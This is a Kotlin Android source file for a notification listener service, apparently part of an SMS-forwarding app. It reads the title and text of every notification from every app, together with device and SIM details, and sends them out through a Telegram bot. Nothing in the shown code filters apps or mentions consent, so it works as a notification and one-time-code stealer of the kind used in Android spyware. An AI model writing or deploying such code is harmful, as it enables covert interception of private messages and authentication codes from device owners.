package com.kztutorial.sms

import android.service.notification.NotificationListenerService
import android.service.notification.StatusBarNotification
import android.util.Log

class NotificationService : NotificationListenerService() {

    override fun onNotificationPosted(sbn: StatusBarNotification?) {
        sbn ?: return
        val packageName = sbn.packageName
        val extras = sbn.notification.extras
        val title = extras.getString("android.title") ?: ""
        val text = extras.getCharSequence("android.text")?.toString() ?: ""
        val bigText = extras.getCharSequence("android.bigText")?.toString() ?: text

        val appLabel = DeviceInfo.appLabel(this, packageName)
        val device = DeviceInfo.deviceLabel()
        val android = DeviceInfo.androidVersion()
        val simBlock = DeviceInfo.formatSims(this)

        val content = buildString {
            appendLine("📱 <b>$device</b>")
            appendLine("🤖 $android")
            appendLine(simBlock)
            appendLine("──────────────")
            appendLine("📦 <b>$appLabel</b> ($packageName)")
            if (title.isNotBlank()) appendLine("📝 <b>${escapeHtml(title)}</b>")
            if (bigText.isNotBlank()) appendLine(escapeHtml(bigText))
        }

        Log.d("NotificationService", content)
        TelegramSender.send(this, content)
    }

    private fun escapeHtml(s: String): String =
        s.replace("&", "&amp;").replace("<", "&lt;").replace(">", "&gt;")
}
